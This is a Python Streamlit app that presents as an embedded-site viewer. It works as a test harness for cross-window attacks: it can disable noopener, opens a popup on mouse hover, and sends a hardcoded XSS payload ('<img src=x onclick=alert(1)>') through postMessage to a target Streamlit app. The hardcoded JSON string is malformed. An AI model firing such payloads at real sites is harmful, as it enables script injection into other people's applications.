import streamlit as st
import streamlit.components.v1 as components
import json

st.set_page_config(page_title="Embedded Site Viewer", layout="wide")

st.title("Embedded Site Viewer")
st.caption("Embed an external site in an iframe.")

with st.sidebar:
    st.header("Iframe Settings")
    target_url = st.text_input("Target URL", value="", placeholder="https://example.com")
    height = st.slider("Iframe height", min_value=400, max_value=1400, value=800, step=50)
    scrolling = st.toggle("Enable scrolling", value=True)

    st.header("Popup Test")
    popup_url = st.text_input(
        "Popup URL",
        value=target_url or "https://target-app.com",
        placeholder="https://target-app.com",
    )

    # Security test controls
    keep_opener_link = st.toggle(
        "Keep opener link (disable noopener/noreferrer)",
        value=False,
        help="Enable only in controlled testing. This recreates the cross-window trust link.",
    )
    target_origin = st.text_input(
        "Expected target origin for postMessage",
        value="https://target-app.com",
        placeholder="https://target-app.com",
    )
    
    use_hardcoded = st.toggle(
        "Use hardcoded XSS test payload",
        value=False,
        help="Send pre-configured XSS test payload with <script> and onerror injection",
    )
    
    if use_hardcoded:
        message_payload = '{"stCommVersion":1,"type":"SET_TOOLBAR_ITEMS","items":[{"borderless":false,"label":"AAAHHHHAHHAHAHHA,"icon":"<img src=x onclick=alert(1)>","key":"xss_test"}]}'
    else:
        message_payload = st.text_area(
            "postMessage payload (JSON)",
            value='{"type":"ping","source":"streamlit-tester"}',
            height=120,
        )

st.info(
    "Some websites cannot be embedded in an iframe because of security headers such as "
    "X-Frame-Options or Content-Security-Policy."
)

if not target_url:
    st.warning("Enter a target URL in the sidebar to render the iframe.")
else:
    if target_url.startswith(("http://", "https://")):
        components.iframe(target_url, height=height, scrolling=scrolling)
    else:
        st.error("Please enter a valid URL that starts with http:// or https://")

st.divider()
st.subheader("window.open() and postMessage Test")
st.caption("Use this to validate popup auth behavior and cross-window messaging controls.")

if popup_url.startswith(("http://", "https://")):
    popup_url_js = json.dumps(popup_url)
    target_origin_js = json.dumps(target_origin.strip())
    keep_opener_js = "true" if keep_opener_link else "false"
    payload_escaped = json.dumps(message_payload)

    components.html(
        f"""
        <div style="font-family: sans-serif;">
          <div style="display:flex;gap:0.5rem;flex-wrap:wrap;">
            <button id="open-btn" style="padding:0.5rem 0.8rem;cursor:pointer;">Open popup</button>
            <button id="send-btn" style="padding:0.5rem 0.8rem;cursor:pointer;">Send postMessage to popup</button>
          </div>
          <div id="status" style="margin-top:0.6rem;color:#444;">Ready.</div>
          <pre id="log" style="margin-top:0.6rem;padding:0.6rem;background:#f7f7f7;border:1px solid #ddd;max-height:220px;overflow:auto;"></pre>
        </div>

        <script>
          const status = document.getElementById("status");
          const log = document.getElementById("log");
          const openBtn = document.getElementById("open-btn");
          const sendBtn = document.getElementById("send-btn");

          const popupUrl = {popup_url_js};
          const expectedOrigin = {target_origin_js};
          const keepOpener = {keep_opener_js};
          const payload = {payload_escaped};

          let popupRef = null;

          function append(line) {{
            log.textContent += (line + "\\n");
          }}

          window.addEventListener("message", (event) => {{
            append("Received message from origin: " + event.origin);
            append("Data: " + JSON.stringify(event.data));
            if (expectedOrigin && event.origin !== expectedOrigin) {{
              append("WARNING: origin mismatch. Message should be rejected by production logic.");
            }}
          }});

          openBtn.addEventListener("mouseenter", () => {{
            if (!popupRef || popupRef.closed) {{
              const features = keepOpener ? "" : "noopener,noreferrer";
              popupRef = window.open(popupUrl, "_blank", features);
              if (popupRef) {{
                status.textContent = "Popup opened.";
                append("Popup opened. opener link enabled: " + keepOpener);
              }} else {{
                status.textContent = "Popup blocked by browser.";
                append("Popup blocked.");
              }}
            }}
          }});

          sendBtn.addEventListener("click", () => {{
            if (!popupRef || popupRef.closed) {{
              append("No live popup reference. Open popup first.");
              return;
            }}
            popupRef.postMessage(payload, expectedOrigin || "*");
            append("Sent postMessage to popup with targetOrigin: " + (expectedOrigin || "*"));
          }});
        </script>
        """,
        height=420,
    )
else:
    st.error("Popup URL must start with http:// or https://")
